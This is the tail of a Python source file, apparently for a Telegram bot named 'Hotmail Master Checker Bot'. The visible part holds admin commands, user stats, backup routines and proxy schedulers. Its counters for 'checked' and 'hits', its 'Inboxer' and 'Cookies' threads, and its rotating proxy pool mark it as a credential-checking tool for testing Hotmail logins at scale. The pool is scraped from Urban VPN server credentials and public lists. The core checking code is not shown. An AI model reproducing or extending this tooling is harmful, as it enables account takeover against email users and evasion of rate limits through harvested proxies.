    db_inst=load_db(); uptime=time.time()-BOT_START_TIME
    uptime_str=time.strftime("%Hh %Mm %Ss",time.gmtime(uptime))
    total_users=len(db_inst.get("users",{})); banned_users=len(db_inst.get("banned",{}))
    approved_users=len(db_inst.get("approved",{})); g=db_inst.get("global_stats",{})
    total_proxies=len(init_proxies())
    with active_checks_lock:
        current_checks=len([k for k in active_checks if not str(k).startswith(("pending_","file_"))])
    body=(f"{E_GREEN} Status: {mono('Online')}\n{E_CLOCK} Uptime: {mono(uptime_str)}\n"
          f"━━━━━━━━━━━━━━━━━━━━\n{E_USER} Users: {mono(str(total_users))}\n"
          f"{E_BAN} Banned: {mono(str(banned_users))}\n{E_CROWN} Approved: {mono(str(approved_users))}\n"
          f"━━━━━━━━━━━━━━━━━━━━\n{E_CHECK} Checked: {mono(str(g.get('total_checked',0)))}\n"
          f"{E_FIRE} Hits: {mono(str(g.get('total_hits',0)))}\n"
          f"{E_BOLT} Active Checks: {mono(str(current_checks))}\n{E_GLOBE} Proxies: {mono(str(total_proxies))}")
    bot.reply_to(message,f"{E_CHART} {bold('Admin Status Panel')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["get_proxies"])
def cmd_get_proxies(message):
    if message.from_user.id!=ADMIN_ID: return
    proxies=init_proxies(); f=io.BytesIO("\n".join(proxies).encode("utf-8")); f.name="proxies.txt"
    body=f"Total: {mono(str(len(proxies)))}\nSource: {PROXIES_FILE}"
    bot.send_document(message.chat.id,f,caption=f"{E_GLOBE} {bold('Current Proxies')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML",reply_to_message_id=message.message_id)

@bot.message_handler(commands=["addproxy"])
def cmd_addproxy(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split(maxsplit=1)
    if len(parts)<2: bot.reply_to(message,f"{E_WARN} Usage: <code>/addproxy &lt;proxy&gt;</code>",parse_mode="HTML"); return
    proxy_str=parts[1].strip(); testing_msg=bot.reply_to(message,f"{E_HOURGLASS} Testing proxy...",parse_mode="HTML")
    alive=False
    for _ in range(2):
        if test_single_proxy(proxy_str): alive=True; break
        time.sleep(1)
    if alive:
        admin_proxies=load_admin_proxies()
        if proxy_str not in admin_proxies: admin_proxies.append(proxy_str)
        save_admin_proxies_to_file(admin_proxies)
        body=f"{E_GLOBE} {mono(proxy_str)}\n{E_GREEN} Status: Live\n💾 Saved to admin list"
        bot.edit_message_text(f"{E_CHECK} {bold('Proxy Added!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",testing_msg.chat.id,testing_msg.message_id,parse_mode="HTML")
    else:
        body=f"{E_GLOBE} {mono(proxy_str)}\n{E_RED} Dead — not added"
        bot.edit_message_text(f"{E_CROSS} {bold('Proxy Dead!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",testing_msg.chat.id,testing_msg.message_id,parse_mode="HTML")

@bot.message_handler(commands=["updatep"])
def cmd_updatep(message):
    if message.from_user.id!=ADMIN_ID: return
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message,f"{E_WARN} Reply to a proxy .txt file!",parse_mode="HTML"); return
    try:
        file_info=bot.get_file(message.reply_to_message.document.file_id)
        file_content=bot.download_file(file_info.file_path)
        new_proxies=[l.strip() for l in file_content.decode("utf-8",errors="ignore").splitlines() if l.strip()]
        save_admin_proxies_to_file(new_proxies)
        body=f"{E_GLOBE} Total: {mono(str(len(new_proxies)))}\n{E_SHIELD} Saved to {ADMIN_PROXIES_FILE}"
        bot.reply_to(message,f"{E_CHECK} {bold('Admin Proxies Updated!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")

@bot.message_handler(commands=["test"])
def cmd_test(message):
    if message.from_user.id!=ADMIN_ID: return
    proxies=init_proxies(); total=len(proxies)
    if total==0: bot.reply_to(message,f"{E_CROSS} No proxies to test!",parse_mode="HTML"); return
    progress_msg=bot.reply_to(message,f"{E_HOURGLASS} Testing {total} proxies...",parse_mode="HTML")
    alive_list=[]; dead_list=[]; tested=0; test_lock=threading.Lock()
    def test_one(p):
        nonlocal tested
        result=test_single_proxy(p)
        with test_lock:
            tested+=1
            (alive_list if result else dead_list).append(p)
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs=[ex.submit(test_one,p) for p in proxies]; last_update=0
        for f in as_completed(futs):
            now=time.time()
            if now-last_update>3:
                last_update=now
                try:
                    pbar=make_progress_bar(tested,total,15)
                    body=f"{mono(pbar)}\n{E_GREEN} Alive: {len(alive_list)}  {E_RED} Dead: {len(dead_list)}"
                    bot.edit_message_text(f"{E_HOURGLASS} {bold('Testing Proxies...')}\n{_bq(body)}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")
                except: pass
    summary_lines=["Proxy Test Results",f"Total: {total}",f"Alive: {len(alive_list)}",f"Dead: {len(dead_list)}","","=== ALIVE ==="]+alive_list+["","=== DEAD ==="]+dead_list
    f=io.BytesIO("\n".join(summary_lines).encode("utf-8")); f.name="proxy_test_results.txt"
    body=f"{E_GREEN} Alive: {mono(str(len(alive_list)))}\n{E_RED} Dead: {mono(str(len(dead_list)))}\n{E_CHART} Total: {mono(str(total))}"
    bot.edit_message_text(f"{E_SHIELD} {bold('Proxy Test Complete!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")
    bot.send_document(message.chat.id,f,caption=f"{E_SHIELD} Proxy test results\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["scrap"])
def cmd_scrap(message):
    if message.from_user.id!=ADMIN_ID: return
    status_msg=bot.reply_to(message,f"{E_HOURGLASS} {bold('Fetching Urban VPN proxies...')}\n{_bq('This may take 1-2 minutes...')}",parse_mode="HTML")
    def do_scrap():
        start_time=time.time(); fetched_count=[0]; total_servers=[0]
        def progress(step,*args):
            if step=="total": total_servers[0]=args[0]
            elif step=="complete": fetched_count[0]=args[0]
        proxies=fetch_urban_vpn_proxies(progress); elapsed=time.time()-start_time
        if not proxies:
            try: bot.edit_message_text(f"{E_CROSS} {bold('Failed to fetch proxies!')}",status_msg.chat.id,status_msg.message_id,parse_mode="HTML")
            except: pass; return
        content="\n".join(f"{p['ip']}:{p['port']}:{p['user']}:{p['pass']}" for p in proxies)
        country_summary=get_country_summary(proxies)
        top_countries=sorted(country_summary.items(),key=lambda x:x[1],reverse=True)[:10]
        country_lines="\n".join(f"  {cc}: {cnt}" for cc,cnt in top_countries)
        if len(country_summary)>10: country_lines+=f"\n  ...and {len(country_summary)-10} more"
        speed_str=f"{len(proxies)/elapsed:.1f} prx/s" if elapsed>0 else "N/A"
        body=(f"{E_CHECK} Fetched: {mono(str(len(proxies)))}\n{E_GLOBE} Servers: {mono(str(total_servers[0]))}\n"
              f"{E_CLOCK} Time: {mono(f'{elapsed:.1f}s')}\n{E_BOLT} Speed: {mono(speed_str)}\n"
              f"━━━━━━━━━━━━━━\n{bold('Top Countries:')}\n<pre>{country_lines}</pre>")
        caption=f"{E_ROCKET} {bold('Proxy Scrape Complete!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}"
        f=io.BytesIO(content.encode("utf-8")); f.name=f"scraped_proxies_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        try: bot.delete_message(status_msg.chat.id,status_msg.message_id)
        except: pass
        bot.send_document(ADMIN_ID,f,caption=caption,parse_mode="HTML")
    threading.Thread(target=do_scrap,daemon=True).start()

@bot.message_handler(commands=["fetch"])
def cmd_fetch(message):
    if message.from_user.id!=ADMIN_ID: return
    send_backup(message.chat.id,"Manual backup requested")

@bot.message_handler(commands=["fetch_full"])
def cmd_fetch_full(message):
    if message.from_user.id!=ADMIN_ID: return
    progress_msg=bot.reply_to(message,f"📦 {bold('Creating full bot backup...')}\n{_bq('Zipping all source files + database...')}",parse_mode="HTML")
    def do_full():
        try:
            send_full_bot_backup(message.chat.id,"Manual full backup requested")
            try: bot.delete_message(progress_msg.chat.id,progress_msg.message_id)
            except: pass
        except Exception as e:
            try: bot.edit_message_text(f"{E_CROSS} Full backup failed: {mono(str(e))}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")
            except: pass
    threading.Thread(target=do_full,daemon=True).start()

@bot.message_handler(commands=["clear_cache"])
def cmd_clear_cache(message):
    if message.from_user.id!=ADMIN_ID: return
    progress_msg=bot.reply_to(message,f"🧹 {bold('Clearing cache...')}\n{_bq('Removing __pycache__, .pyc, logs...')}",parse_mode="HTML")
    def do_clear():
        try:
            pycache_dirs=0; pyc_files=0; freed_pycache=0; freed_log=0; tmp_files=0; freed_tmp=0
            for root,dirs,files2 in os.walk(_BASE):
                for d in dirs:
                    if d=="__pycache__":
                        dp=os.path.join(root,d)
                        try:
                            sz=sum(os.path.getsize(os.path.join(dp,f2)) for f2 in os.listdir(dp) if os.path.isfile(os.path.join(dp,f2)))
                            shutil.rmtree(dp); pycache_dirs+=1; freed_pycache+=sz
                        except: pass
                for f2 in files2:
                    if f2.endswith(".pyc"):
                        try: os.remove(os.path.join(root,f2)); pyc_files+=1
                        except: pass
            if os.path.exists(LOG_FILE):
                try:
                    sz=os.path.getsize(LOG_FILE)
                    with open(LOG_FILE,"w"): pass
                    freed_log=sz
                except: pass
            tmpdir=tempfile.gettempdir()
            for f2 in os.listdir(tmpdir):
                fp=os.path.join(tmpdir,f2)
                if f2.startswith("checker_") or f2.startswith("tmp"):
                    try:
                        if os.path.isfile(fp): sz=os.path.getsize(fp); os.remove(fp); tmp_files+=1; freed_tmp+=sz
                        elif os.path.isdir(fp):
                            sz=sum(os.path.getsize(os.path.join(fp,x)) for x in os.listdir(fp) if os.path.isfile(os.path.join(fp,x)))
                            shutil.rmtree(fp); tmp_files+=1; freed_tmp+=sz
                    except: pass
            def _human(b):
                for u in ["B","KB","MB","GB"]:
                    if b<1024: return f"{b:.2f} {u}"
                    b/=1024
                return f"{b:.2f} GB"
            body=(f"📁 <b>__pycache__ dirs:</b> {mono(str(pycache_dirs))}  freed {mono(_human(freed_pycache))}\n"
                  f"🐍 <b>.pyc files:</b> {mono(str(pyc_files))}\n"
                  f"📋 <b>bot.log:</b> truncated  freed {mono(_human(freed_log))}\n"
                  f"🗑️ <b>Temp files:</b> {mono(str(tmp_files))}  freed {mono(_human(freed_tmp))}\n"
                  f"━━━━━━━━━━━━━━\n💾 <b>Total freed:</b> {mono(_human(freed_pycache+freed_log+freed_tmp))}")
            bot.edit_message_text(f"🧹 {bold('Cache Cleared!')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")
        except Exception as e:
            bot.edit_message_text(f"{E_CROSS} Cache clear failed: {mono(str(e))}",progress_msg.chat.id,progress_msg.message_id,parse_mode="HTML")
    threading.Thread(target=do_clear,daemon=True).start()

@bot.message_handler(commands=["users"])
def cmd_users(message):
    if message.from_user.id!=ADMIN_ID: return
    db_inst=load_db(); users=db_inst.get("users",{})
    if not users: bot.reply_to(message,f"{E_CROSS} No users yet.",parse_mode="HTML"); return
    lines=[]
    for uid,u in list(users.items())[:50]:
        lines.append(f"{E_USER} {mono(uid)} | @{u.get('username','N/A')} | {u.get('total_checked',0)} checked | {u.get('total_hits',0)} hits")
    bot.reply_to(message,f"{E_CHART} {bold('Users')}\n"+"\n".join(lines)+f"\n\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["userinfo"])
def cmd_userinfo(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split()
    if len(parts)<2: bot.reply_to(message,f"{E_WARN} Usage: <code>/userinfo &lt;id&gt;</code>",parse_mode="HTML"); return
    target_id=parts[1]; db_inst=load_db(); u=db_inst.get("users",{}).get(target_id)
    if not u: bot.reply_to(message,f"{E_CROSS} User not found.",parse_mode="HTML"); return
    banned="Yes" if target_id in db_inst.get("banned",{}) else "No"
    approved="Yes" if target_id in db_inst.get("approved",{}) else "No"
    body=(f"{E_USER} ID: {mono(target_id)}\n@{u.get('username','N/A')}\nName: {u.get('full_name','N/A')}\n"
          f"First seen: {u.get('first_seen','N/A')}\nLast seen: {u.get('last_seen','N/A')}\n"
          f"Checked: {u.get('total_checked',0)}\nHits: {u.get('total_hits',0)}\n"
          f"Checks: {u.get('checks_count',0)}\nBanned: {banned}\nApproved: {approved}")
    bot.reply_to(message,f"{E_CHART} {bold('User Info')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["deleteuser"])
def cmd_deleteuser(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split()
    if len(parts)<2: bot.reply_to(message,f"{E_WARN} Usage: <code>/deleteuser &lt;id&gt;</code>",parse_mode="HTML"); return
    target_id=parts[1]; db_inst=load_db()
    if target_id in db_inst.get("users",{}):
        del db_inst["users"][target_id]
        db_inst.get("banned",{}).pop(target_id,None); db_inst.get("approved",{}).pop(target_id,None)
        save_db(db_inst)
        bot.reply_to(message,f"{E_CHECK} {bold('User deleted!')}\n{E_USER} ID: {mono(target_id)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    else: bot.reply_to(message,f"{E_CROSS} User not found.",parse_mode="HTML")

@bot.message_handler(commands=["myip"])
def cmd_myip(message):
    if message.from_user.id!=ADMIN_ID: return
    try:
        r=requests.get("https://httpbin.org/ip",timeout=10); ip=r.json().get("origin","Unknown")
        bot.reply_to(message,f"{E_GLOBE} {bold('Bot IP:')}\n{mono(ip)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")

@bot.message_handler(commands=["threads"])
def cmd_threads(message):
    if message.from_user.id!=ADMIN_ID: return
    body=(f"{E_GEAR} Master: {mono(str(MASTER_THREADS))}\n{E_GEAR} Inboxer: {mono(str(INBOXER_THREADS))}\n"
          f"{E_GEAR} Cookies: {mono(str(COOKIES_THREADS))}\n{E_GEAR} Max Retries: {mono(str(MAX_RETRIES))}\n"
          f"{E_GEAR} Max Lines: {mono(str(MAX_LINES))}")
    bot.reply_to(message,f"{E_CHART} {bold('Thread Config')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["globalstats"])
def cmd_globalstats(message):
    if message.from_user.id!=ADMIN_ID: return
    db_inst=load_db(); g=db_inst.get("global_stats",{})
    body=(f"{E_CHECK} Total Checked: {mono(str(g.get('total_checked',0)))}\n"
          f"{E_FIRE} Total Hits: {mono(str(g.get('total_hits',0)))}\n"
          f"{E_FILE} Total Lines: {mono(str(g.get('total_lines_checked',0)))}")
    bot.reply_to(message,f"{E_CHART} {bold('Global Stats')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["restart_proxy"])
def cmd_restart_proxy(message):
    if message.from_user.id!=ADMIN_ID: return
    bot.reply_to(message,f"{E_HOURGLASS} {bold('Restarting proxy fetch...')}",parse_mode="HTML")
    def do_restart():
        try:
            open(PROXIES_FILE,"w").close(); auth_proxy=None
            raw=scrape_all()
            if raw:
                live=find_live_proxies(raw,max_live=4)
                if live: auth_proxy=live[0]
            proxies=fetch_urban_vpn_proxies(auth_proxy=auth_proxy)
            if proxies:
                lines=[f"{p['ip']}:{p['port']}:{p['user']}:{p['pass']}" for p in proxies]
                save_proxies_to_file(lines); update_global_proxy_pool()
                bot.send_message(message.chat.id,f"{E_CHECK} {bold('Proxies refreshed!')}\n{mono(str(len(proxies)))} fetched.",parse_mode="HTML")
            else:
                bot.send_message(message.chat.id,f"{E_CROSS} {bold('Proxy fetch failed.')}",parse_mode="HTML")
        except Exception as e:
            bot.send_message(message.chat.id,f"{E_CROSS} Error: {mono(str(e))}",parse_mode="HTML")
    threading.Thread(target=do_restart,daemon=True).start()

@bot.message_handler(commands=["refresh"])
def cmd_refresh(message):
    if message.from_user.id!=ADMIN_ID: return
    bot.reply_to(message,f"{E_CHECK} {bold('Bot refreshed!')}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

@bot.message_handler(commands=["logs"])
def cmd_logs(message):
    if message.from_user.id!=ADMIN_ID: return
    parts=message.text.split(); minutes=5
    if len(parts)>1:
        try: minutes=int(parts[1])
        except: pass
    logs=get_last_minutes(minutes)
    if len(logs)>4000:
        f=io.BytesIO(logs.encode("utf-8")); f.name=f"logs_last_{minutes}m.txt"
        bot.send_document(message.chat.id,f,caption=f"{E_FILE} Last {minutes} min logs")
    else:
        bot.reply_to(message,f"{E_FILE} {bold(f'Last {minutes} min logs:')}\n<pre>{logs}</pre>",parse_mode="HTML")

@bot.message_handler(commands=["pool_status"])
def cmd_pool_status(message):
    if message.from_user.id!=ADMIN_ID: return
    with global_proxy_pool_lock: pool_size=len(global_proxy_pool)
    fetched=load_proxies_from_file(); admin=load_admin_proxies()
    body=(f"{E_GLOBE} Global pool: {mono(str(pool_size))}\n{E_GLOBE} Auto-fetched: {mono(str(len(fetched)))}\n"
          f"{E_GLOBE} Admin proxies: {mono(str(len(admin)))}\n{E_GLOBE} Total (merged): {mono(str(len(init_proxies())))}")
    bot.reply_to(message,f"{E_CHART} {bold('Proxy Pool Status')}\n{_bq(body)}\n{E_GEAR} {italic(DEV_TAG)}",parse_mode="HTML")

# ══════════════════════════════════════════════════════════
#  SCHEDULERS
# ══════════════════════════════════════════════════════════

def _backup_scheduler():
    while True:
        time.sleep(BACKUP_INTERVAL)
        try:
            if os.path.exists(DB_FILE):
                ts=datetime.now().strftime("%Y%m%d_%H%M%S")
                backup_path=os.path.join(_BASE,f"db_backup_{ts}.json")
                shutil.copy2(DB_FILE,backup_path)
                _log("💾","dim","BACKUP",f"DB backed up to {backup_path}")
        except Exception as e:
            _log("⚠️","yellow","BACKUP",f"Failed: {e}")

def _proxy_scheduler():
    batch_num=0
    while True:
        time.sleep(PROXY_BATCH_INTERVAL); batch_num+=1
        try:
            is_clear=(batch_num%PROXY_CLEAR_AFTER_BATCHES==0)
            if is_clear:
                open(PROXIES_FILE,"w").close()
                _log("🗑️","yellow","PROXY",f"Batch {batch_num} — cleared proxy file")
            auth_proxy=None; raw=scrape_all()
            if raw:
                live=find_live_proxies(raw,max_live=4)
                if live: auth_proxy=live[0]
            proxies=fetch_urban_vpn_proxies(auth_proxy=auth_proxy)
            if proxies:
                lines=[f"{p['ip']}:{p['port']}:{p['user']}:{p['pass']}" for p in proxies]
                if not is_clear:
                    existing=set(load_proxies_from_file()); lines=[l for l in lines if l not in existing]
                with open(PROXIES_FILE,"a",encoding="utf-8") as f:
                    for ln in lines: f.write(ln+"\n")
                pool=update_global_proxy_pool()
                _log("✅","green","PROXY",f"Batch {batch_num}: {len(proxies)} fetched, pool: {pool}")
            else:
                _log("⚠️","yellow","PROXY",f"Batch {batch_num}: fetch returned 0")
        except Exception as e:
            _log("⚠️","yellow","PROXY",f"Batch {batch_num} failed: {e}")

# ══════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════

if __name__=="__main__":
    if not BOT_TOKEN:
        console.print("[bold red]❌ BOT_TOKEN is not set! Provide it via the 'bot_token' environment variable or config.json.[/bold red]")
        sys.exit(1)
    if ADMIN_ID==0:
        console.print("[bold yellow]⚠️ ADMIN_ID is not set! Provide it via the 'admin_id' environment variable or config.json.[/bold yellow]")

    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    os.makedirs(RESULTS_DIR, exist_ok=True)

    if bot is None:
        console.print("[bold red]❌ BOT_TOKEN is not set! Provide it via the 'bot_token' environment variable or config.json.[/bold red]")
        sys.exit(1)
    BOT_START_TIME=time.time()

    try:
        bot.remove_webhook(); time.sleep(0.5)
    except: pass

    threading.Thread(target=_backup_scheduler,daemon=True).start()
    threading.Thread(target=_proxy_scheduler,daemon=True).start()

    def _initial_fetch():
        time.sleep(2)
        try:
            open(PROXIES_FILE,"w").close(); auth_proxy=None
            raw=scrape_all()
            if raw:
                live=find_live_proxies(raw,max_live=4)
                if live: auth_proxy=live[0]
            proxies=fetch_urban_vpn_proxies(auth_proxy=auth_proxy)
            if proxies:
                lines=[f"{p['ip']}:{p['port']}:{p['user']}:{p['pass']}" for p in proxies]
                save_proxies_to_file(lines); pool=update_global_proxy_pool()
                _log("✅","green","STARTUP",f"Fetched {len(proxies)} proxies, pool: {pool}")
            else:
                _log("⚠️","yellow","STARTUP","Initial proxy fetch returned 0 — using built-ins")
                save_proxies_to_file(BUILTIN_PROXIES); update_global_proxy_pool()
        except Exception as e:
            _log("⚠️","yellow","STARTUP",f"Proxy fetch failed: {e} — using built-ins")
            save_proxies_to_file(BUILTIN_PROXIES); update_global_proxy_pool()
    threading.Thread(target=_initial_fetch,daemon=True).start()

    console.print("[bold red]"
    "  ██╗  ██╗ ██████╗ ████████╗███╗   ███╗ █████╗ ██╗██╗\n"
    "  ██║  ██║██╔═══██╗╚══██╔══╝████╗ ████║██╔══██╗██║██║\n"
    "  ███████║██║   ██║   ██║   ██╔████╔██║███████║██║██║\n"
    "  ██╔══██║██║   ██║   ██║   ██║╚██╔╝██║██╔══██║██║██║\n"
    "  ██║  ██║╚██████╔╝   ██║   ██║ ╚═╝ ██║██║  ██║██║███████╗\n"
    "  ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝[/bold red]")
    console.print(f"[bold magenta]  ╔══════════════════════════════════════════════════════╗[/bold magenta]")
    console.print(f"[bold magenta]  ║  🔥 HOTMAIL MASTER CHECKER BOT v4.0  •  {DEV_TAG}  ║[/bold magenta]")
    console.print(f"[bold magenta]  ╚══════════════════════════════════════════════════════╝[/bold magenta]")
    console.print(f"[dim]  Config: {_CONFIG_PATH}[/dim]")
    console.print(f"[dim]  DB:     {DB_FILE}[/dim]")
    console.print(f"[dim]  Proxies:{PROXIES_FILE}[/dim]")
    console.print(f"[green]  Bot started. Polling for updates...[/green]")

    file_log("Bot started","INFO")

    try:
        bot.infinity_polling(
            skip_pending=True,timeout=30,long_polling_timeout=30,interval=1,
            allowed_updates=["message","callback_query","inline_query"],logger_level=30)
    except KeyboardInterrupt:
        _log("👋","cyan","POLLING","Stopped by user")
    except Exception as e:
        _log("⚠️","yellow","POLLING",f"Fatal: {str(e)[:100]}")
        file_log(f"Polling fatal: {e}","ERROR")
